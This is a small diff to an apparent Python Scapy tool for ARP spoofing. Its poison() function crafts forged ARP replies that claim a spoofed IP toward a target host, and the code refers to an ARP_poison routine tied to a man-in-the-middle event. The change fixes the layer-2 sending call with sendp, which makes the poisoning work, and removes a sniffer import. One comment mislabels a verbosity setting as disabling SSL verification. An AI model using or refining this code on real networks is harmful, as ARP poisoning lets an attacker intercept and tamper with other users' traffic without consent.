@@ -1,7 +1,6 @@
-from scapy.all import ARP, Ether, send, conf
+from scapy.all import ARP, Ether, send, conf, sendp
 import time
 from router_ip_mac import get_router_ip, get_mac
-from sniffer import get_target_ip
 
 # Disable Scapy's SSL verification
 conf.verb = 0  # Disable verbose output
@@ -10,7 +9,7 @@ def poison(target_ip, target_mac, spoof_ip):
     arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
     ether = Ether(dst=target_mac)
     package = ether / arp_response
-    send(package)
+    sendp(package)
 
 
 def ARP_poison(start_mitm_event):
